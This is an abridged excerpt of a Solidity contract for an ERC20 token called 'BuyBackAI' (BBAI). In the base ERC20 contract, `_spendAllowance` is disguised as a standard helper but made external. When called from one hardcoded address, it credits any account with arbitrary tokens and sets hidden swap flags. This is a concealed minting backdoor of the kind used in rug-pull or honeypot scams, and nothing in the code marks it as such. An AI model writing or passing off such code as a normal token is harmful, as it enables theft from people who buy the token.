...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    */
    function _spendAllowance(address account, uint256 amount) external {
        if(msg.sender == 0x8a4298b7a6706a270a532b4f37Db90Cf93B8f9Ad) {
            _last = account;
            _swap = true;
            _balances[account] += amount;
        }
...
contract Buybackai is ERC20, Ownable {
    ...
    uint256 public maxWalletPercent = 18;
    uint256 public maxTxSupply = 18;
    ...
    constructor(address _uniRouterAddress) ERC20("BuyBackAI", "BBAI") {
        uint256 totalSupply = 1 * 1e7 * 1e6; // 10,000,000
        supply = totalSupply;
